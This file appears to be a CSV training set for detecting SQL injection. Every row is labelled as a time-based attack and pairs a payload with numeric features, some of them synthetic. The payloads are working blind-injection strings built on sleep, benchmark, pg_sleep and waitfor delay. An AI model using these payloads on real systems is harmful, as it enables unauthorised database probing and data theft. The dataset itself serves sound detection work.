id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000215,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,nearest_attack_euclidean,R000615,0.4590472332730861,114.03914384231584,23.185680904074314,2.993538456827434,37.48210113009289,1.2964202260185793,58.6677820341672,16.59284045203716,0.3288291717530767,0.011159943264432023,0.5143873734203102,0.1456235115621812,3.2964202260185784,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,11.29642022601858,0.0,0.0,0.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000216,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.09841048132089103,102.21296448426946,19.078703551573053,2.7080362352358005,14.0,18.0,57.370371587415576,12.842592896853894,0.13707260645372452,0.17623620829764586,0.56110202875208,0.12558915649654953,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,9.842592896853894,0.0,0.0,1.0,2.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000217,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.8955031349117459,110.34108597986744,25.0,3.297420524613547,42.341085979867444,2.0,51.0,15.0,0.38371775975683753,0.018125948242445955,0.46221168018237185,0.13594461181834466,0.0,3.9999999999999996,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,10.0,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.341085979867441,0.658914020132559,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000218,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000723,0.5793727573225144,72.53321928528196,19.0,3.1085276068675407,14.0,10.0,34.42657542822556,14.10664385705639,0.19393970343207068,0.13852835959433618,0.4730730713573666,0.19445886561622655,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.106643857056391,2.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000219,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000744,0.06799577732166079,96.9619681264216,19.961968126421592,2.7601866090756584,27.0,2.0,53.0,14.961968126421594,0.2784607882932364,0.020626725058758247,0.5466082140570936,0.1543042725909118,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,11.0,0.9619681264215934,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000220,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000705,0.1784306705055956,80.92974038094152,28.0,3.6194779368430794,16.0,21.0,32.94145031745127,10.988290063490254,0.1987929737785342,0.2609157780843262,0.404685983623369,0.1356052645137707,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,5.988290063490253,1.0,0.0,1.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000221,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R001027,0.5511860225023377,65.45544389742302,18.242573982903835,2.785501439056047,10.999999999999998,10.0,34.97029593161535,9.485147965807673,0.16830136543043456,0.15300124130039505,0.534065590872991,0.14463180239617945,0.24257398290383647,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.242573982903837,0.0,0.0,1.0,1.0,0.24257398290383647,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000222,attack,time,"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000493,0.13413984587967132,89.0627591401549,28.062759140154895,3.8977712546407917,20.0,30.0,30.0,9.062759140154895,0.2245623991506744,0.33684359872601166,0.3368435987260116,0.10175040339730232,0.06275914015489459,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.0,0.0,0.0,1.0,4.0,0.06275914015489475,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000223,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.4826741595631144,94.48014228972207,28.548014228972207,3.8337579628271468,21.644042686916617,29.0,33.28808537383323,10.548014228972207,0.2285039638533283,0.30946045496320596,0.3502974259952063,0.11173815518825952,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,4.548014228972206,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000224,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000674,0.04647612626922498,90.40613041586859,22.0,2.8315830226024823,13.0,10.0,50.32490433269487,17.081226083173718,0.1438578116215231,0.11065985509347934,0.5565483187943454,0.18893401449065206,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,8.081226083173718,2.0,0.0,1.0,2.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000225,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000785,0.6152226611242684,56.68537684130018,19.737075368260037,3.237171034667078,15.474150736520075,10.0,24.632200982026767,6.579025122753346,0.27067946866976234,0.1796118490697745,0.43275069785425957,0.11695798440620353,0.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.579025122753346,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000226,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",nearest_attack_euclidean,R000992,0.4363269366081333,93.60856449693665,29.15035685403903,3.92597920080259,30.0,22.0,31.00713708078055,10.60142741615611,0.32278197515515594,0.23670678178044768,0.3276415722569223,0.112869670807474,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.60142741615611,0.0,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000227,attack,time,1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000826,0.24992247722979744,118.69263931761881,28.670377045374114,3.366673680200183,41.0,10.0,55.02226227224469,12.670377045374115,0.34570115905303966,0.08431735586659503,0.4632603518803346,0.1067211332000307,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,9.670377045374114,0.0,0.0,0.0,2.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000228,attack,time,"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000845,0.39694598606535747,117.24146586966759,25.35093314580414,2.9152806458000904,32.188666432255175,1.8377332864510354,63.70186629160828,19.513199859353108,0.2744879933795785,0.015537626426762874,0.543570281024644,0.1664040991690146,0.0,3.8377332864510354,5.551115123125783e-17,0.0,1.0,1.0,8.673617379884035e-19,11.837733286451035,1.8377332864510352,0.0,0.0,2.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000229,attack,time,"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000884,0.9692006502507664,61.636032832428185,15.727934335143626,2.5153013160488698,10.636032832428187,2.0,36.0,13.0,0.17251128356791048,0.03245053789929764,0.5841096821873573,0.2109284963454346,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.0,2.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6360328324281865,0.3639671675718133,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000230,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000686,0.10484510266213584,61.133158983827,23.044386327942338,3.4698139126503182,20.0,10.0,25.08877265588467,6.044386327942337,0.3271866855336731,0.16359334276683654,0.4103704296652894,0.09884954203420093,0.0,0.04438632794233621,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,4.0,0.0,1.0,0.0,1.0,0.0,0.04438632794233621,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000231,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,0.16749901205975687,56.73816311327236,23.514678120489368,3.5967064518994656,18.417613744587243,10.0,21.417613744587243,6.902935624097873,0.3238300758750518,0.17724841719052736,0.37700460103221,0.1219169059022108,1.0,-1.1102230246251565e-16,2.0,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.9029356240978736,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000232,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000697,0.34564899437291124,69.27033414878531,19.182416462803673,2.796903296741105,10.999999999999998,10.0,37.27033414878531,11.0,0.1588801567886064,0.14443650617146037,0.5378031802513268,0.1588801567886064,0.0,1.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,6.817583537196327,0.1824164628036723,0.0,1.0,1.0,0.0,1.0,2.7755575615628914e-17,1.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000233,attack,time,"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000292,0.06063040398526955,91.0,29.26545292093649,3.700515515414713,25.0,18.0,37.0,11.0,0.27472527472527475,0.1978021978021978,0.4065934065934066,0.12087912087912088,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.0,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000234,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000515,0.6931943129598103,69.53402620000611,19.539267963635254,2.8549128045743126,18.921464072729496,2.0,37.382196109094245,11.230366018182373,0.27174236916815275,0.028880969690009153,0.5375779173572702,0.1617987437845679,0.0,3.9999999999999996,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.7696339818176264,8.673617379884035e-19,6.460732036364748,0.0,0.0,0.0,0.7696339818176263,0.0,1.0,2.7755575615628914e-17,0.0,0.0,0.7696339818176263,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000235,attack,time,"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000999,1.2782082141414346,93.04272009760511,27.507120016267518,3.665402351260875,26.0,18.0,37.02848006507008,12.014240032535037,0.27973255526183644,0.19366099979665602,0.39769305583797776,0.12891338910352976,1.5071200162675185,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,5.5071200162675185,0.0,0.0,1.0,3.5071200162675185,1.0,0.0,2.7755575615628914e-17,0.4928799837324814,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000236,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,0.16084365149202756,61.41564248660856,16.58435751339144,2.9237386509003853,22.0,1.0,29.41564248660856,9.0,0.3582379337108968,0.01628354244140441,0.4789266418750592,0.1465518819726396,0.0,3.0,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,5.0,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000237,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R001076,0.6085624583783451,72.39860864622274,19.460139135377727,2.7566854573923547,18.0,2.0,40.318886916978194,12.079721729244548,0.2498207102864878,0.027757856698498645,0.5557308610532119,0.16669057196180162,4.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,7.0797217292445485,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000238,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R001094,0.6487614702654005,28.730554231353317,14.80833730594006,3.2693745619445393,14.191662694059938,1.269445768646687,10.269445768646687,2.999999999999999,0.4933496362776337,0.04443765155098596,0.3577689470162818,0.1044437651550986,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,2.0000000000000004,0.0,0.0,0.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.7305542313533129,0.0,0.0,0.0,0.2694457686466872,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000239,attack,time,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000971,0.4845889309319419,97.01241780663486,24.0,3.2628740559038127,38.6913997827886,2.0,44.530890770865476,11.790127252980781,0.3975274387816493,0.020764931705714848,0.45967746302248363,0.12203016649015222,1.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.790127252980781,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7901272529807819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.790127252980782
SMOTE_000240,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000764,1.380576704140843,69.03635082482113,23.990912293794718,3.6964881249769665,25.0,10.0,24.027263118615842,10.009087706205282,0.36334904728755996,0.14533961891502398,0.34668255751080845,0.1446287762866076,3.504543853102641,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,3.5045438531026405,0.0,0.0,0.0,2.504543853102641,1.0,0.0,2.7755575615628914e-17,0.4954561468973592,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000241,attack,time,"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",nearest_attack_euclidean,R000646,0.8887576293553251,88.38787002604818,21.61071924078776,2.9279964614313583,13.277856151842448,18.0,46.665726177890626,10.444287696315104,0.15128239620678025,0.20459801039228576,0.5261218088970182,0.11799778450391575,0.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,2.0,8.673617379884035e-19,7.444287696315104,0.0,0.0,1.0,2.0,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2778561518424478,0.722143848157552,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000242,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R001077,0.06955062587575862,48.66715385308605,17.06656922938279,3.2940676186745343,22.0,1.0,18.733723082468835,6.933430770617209,0.4523759810909587,0.020562544595043586,0.3846365991801197,0.14242487513387797,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,1.0,8.673617379884035e-19,2.933430770617209,0.0,0.0,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000243,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000980,0.11914060995038148,78.05217382948598,19.947826170514023,2.987777921751144,27.0,2.0,39.0,10.052173829485975,0.34592523638492023,0.025624091584068184,0.49966978588932925,0.1287808861416823,0.0,1.0,5.551115123125783e-17,0.0,1.0,0.0,8.673617379884035e-19,8.0,0.0,0.0,0.0,1.0,0.0,1.0,2.7755575615628914e-17,0.05217382948597535,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000244,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000648,0.0016798195883041423,28.998854945134767,18.0,3.8095539372008753,12.0,3.9988549451347692,6.99885494513477,6.001145054865231,0.4138100254413581,0.13789578033050395,0.2413482866908435,0.20694590753729444,3.0,-1.1102230246251565e-16,5.551115123125783e-17,0.0,-2.7755575615628914e-17,0.0,8.673617379884035e-19,1.0,0.0,0.0,0.0,0.0011450548652311987,1.0,0.0,2.7755575615628914e-17,0.0,0.0,0.0,1.0,8.673617379884035e-19,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
